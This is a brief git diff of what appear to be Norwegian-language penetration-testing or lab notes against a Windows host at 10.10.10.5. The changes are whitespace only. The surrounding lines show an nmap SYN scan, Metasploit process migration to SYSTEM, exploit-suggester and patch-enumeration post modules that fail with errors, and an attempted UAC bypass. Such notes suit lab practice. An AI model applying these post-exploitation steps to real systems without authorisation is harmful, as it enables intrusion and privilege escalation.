@@ -8,8 +8,6 @@
 
 **kjør ps: migrate til hvilken som helst prosess som er system. woosh**
 
-
-
 windows maskin
 
 `oot@kali:~# nmap -sS -P0 10.10.10.5`
@@ -69,7 +67,7 @@ net users
 
     **
 
-use post/multi/recon/local\_exploit\_suggester **        
+use post/multi/recon/local\_exploit\_suggester **          
 **FORSØKT ALLE DISSE UTEN HELL\*\*
 
 ```
@@ -115,8 +113,8 @@ msf post\(enum\_patches\) &gt; set session 2
 session =&gt; 2  
 msf post\(enum\_patches\) &gt; exploit
 
-\[-\] Post failed: NoMethodError undefined method `[]' for nil:NilClass        
-[-] Call stack:        
+\[-\] Post failed: NoMethodError undefined method `[]' for nil:NilClass          
+[-] Call stack:          
 [-]   /usr/share/metasploit-framework/modules/post/windows/gather/enum_patches.rb:72:in`run'  
 \[\*\] Post module execution completed
 
@@ -124,8 +122,6 @@ msf post\(enum\_patches\) &gt; run
 
 \[-\] Known bug in WMI query, try migrating to another process  
 \[\*\] Post module execution completed
-
-
 
 **forsøkte å bypasse uac**  
 msf exploit\(bypassuac\) &gt; exploit
